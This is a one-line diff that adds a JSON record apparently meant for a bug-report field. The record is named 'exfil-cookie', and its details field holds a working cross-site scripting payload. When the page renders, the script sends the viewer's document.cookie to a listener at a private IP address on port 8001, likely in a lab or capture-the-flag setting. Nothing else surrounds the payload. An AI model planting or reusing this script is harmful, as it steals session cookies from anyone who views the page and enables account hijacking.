@@ -1,0 +1,1 @@
+{"bugName": "exfil-cookie", "bugDetails": "<script>(()=>{try{new Image().src='http://10.10.14.50:8001/c?c='+encodeURIComponent(document.cookie);}catch(e){}})();</script>"}
